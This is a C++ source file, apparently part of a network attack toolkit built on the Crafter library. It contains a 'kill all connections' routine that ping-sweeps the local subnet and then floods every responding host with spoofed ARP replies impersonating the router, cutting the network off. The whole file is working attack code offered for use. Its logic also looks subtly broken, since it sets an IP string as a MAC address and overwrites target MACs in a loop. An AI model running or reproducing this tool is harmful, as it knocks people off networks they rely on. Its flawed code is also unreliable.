using namespace std;
using namespace Crafter;

static bool plural_arp_cont = true;

struct plural_spoof_infos
{
    string iface;
    vector<Packet> packets_to_send;
};

void *plural_arp_spoof(void *arg)
{
    plural_spoof_infos *spoof_infos = static_cast<plural_spoof_infos*>(arg);
    vector<Packet>::iterator it;
    Packet packet_buffer;
    unsigned int counter = 0;
    while(plural_arp_cont)
    {
        for(it = spoof_infos->packets_to_send.begin(); it < spoof_infos->packets_to_send.end(); it++)
        {
            packet_buffer = *it;
            packet_buffer.Send(spoof_infos->iface);
            counter++;
            sleep(1);
        }
    }
    pthread_exit(NULL);
}

void kill_all_connections(const string iface)
{
    unsigned int dot_counter = 0;
    const string myIP = GetMyIP(iface), myMAC = GetMyMAC(iface);
    char networkToScan[13] = "", router_ip[15] = "";
    plural_spoof_infos spoof_infos{};
    spoof_infos.iface = iface;
    cout << endl << "========== " << MENU_COLOR << "Kill all connections on this network" << NORMAL_COLOR << " ==========" << endl << endl;

    for(unsigned int i = 0; i < myIP.size(); i++)
    {
        if(myIP[i] != '.')
        {
            networkToScan[i] = myIP[i];
            router_ip[i] = myIP[i];
        }
        else
        {
            networkToScan[i] = '.';
            router_ip[i] = '.';
            dot_counter++;
            if(dot_counter == 3)
            {
                networkToScan[i+1] = '*';
                networkToScan[i+2] = '\0';
                router_ip[i+1] = '1';
                router_ip[i+2] = '\0';
                break;
            }
        }
    }
    IP ip_header;
    ip_header.SetSourceIP(GetMyIP(iface));
    ICMP icmp_header;
    icmp_header.SetType(ICMP::EchoRequest);
    icmp_header.SetPayload("\n");

    cout << "[" << INFO_COLOR << "@" << NORMAL_COLOR << "] The network to attack is : " << INFO_COLOR << networkToScan << NORMAL_COLOR << endl;
	vector<string> net = GetIPs(networkToScan);
	vector<string>::iterator it_str;

	vector<Packet*> pings_packets;

	for(it_str = net.begin(); it_str != net.end(); it_str++)
	{
		ip_header.SetDestinationIP(*it_str);
		icmp_header.SetIdentifier(RNG16());
		pings_packets.push_back(new Packet(ip_header / icmp_header));
	}

	cout << "[" << INFO_COLOR << "@" << NORMAL_COLOR << "] Network scan in process..." << endl;

	vector<Packet*> pongs_packets(pings_packets.size());
	SendRecv(pings_packets.begin(), pings_packets.end(), pongs_packets.begin(), iface, 1, 3, 48);

    vector<string> mac_targets;
    vector<string> ip_targets;
    vector<Packet*>::iterator it_pck;

    for(it_pck = pongs_packets.begin(); it_pck < pongs_packets.end(); it_pck++)
    {
        Packet *packet_buffer = *it_pck;
        if(packet_buffer)
        {
            Ethernet *ether_buffer = packet_buffer->GetLayer<Ethernet>();
            mac_targets.push_back(ether_buffer->GetSourceMAC());
            IP *ip_buffer = packet_buffer->GetLayer<IP>();
            ip_targets.push_back(ip_buffer->GetSourceIP());
        }
    }
    for(it_pck = pings_packets.begin(); it_pck < pings_packets.end(); it_pck++)
        delete *it_pck;

	cout << "[" << INFO_COLOR << "@" << NORMAL_COLOR << "] Scan finished, attack in process..." << endl;

	Ethernet ether_header;
	ether_header.SetSourceMAC(router_ip);
	ARP arp_header;
	arp_header.SetOperation(ARP::Reply);
	arp_header.SetSenderIP(router_ip);
	vector<Packet> spoofed_arp_packets;
	for(it_str = mac_targets.begin(); it_str < mac_targets.end(); it_str++)
	{
        if(*it_str != "")
        {
            ether_header.SetDestinationMAC(*it_str);
            arp_header.SetTargetMAC(*it_str);
        }
	}
	for(it_str = ip_targets.begin(); it_str < ip_targets.end(); it_str++)
	{
        if(*it_str != "")
        {
            arp_header.SetTargetIP(*it_str);
            Packet packet(ether_header / arp_header);
            spoofed_arp_packets.push_back(packet);
        }
	}
    spoof_infos.packets_to_send = spoofed_arp_packets;

    /*
    Il faut envoyer le contenu de spoofed_arp_packet sur le réseau continuellement
    pour couper toutes les connections locales
    */
    pthread_t spoofThread;
    pthread_create(&spoofThread, NULL, plural_arp_spoof, (void*)&spoof_infos);
    cout << "[" << SUCCESS_COLOR << "+" << NORMAL_COLOR << "] Thread process, network theoretically " << SUCCESS_COLOR << "down" << NORMAL_COLOR << endl;
    cout << "Press \"Enter\" to undone" << endl;
    getchar();
    plural_arp_cont = false;

    cout << "[" << SUCCESS_COLOR << "+" << NORMAL_COLOR << "] Thread stopped" << endl << endl;

    for(it_pck = pongs_packets.begin(); it_pck < pongs_packets.end(); it_pck++)
        delete *it_pck;
}
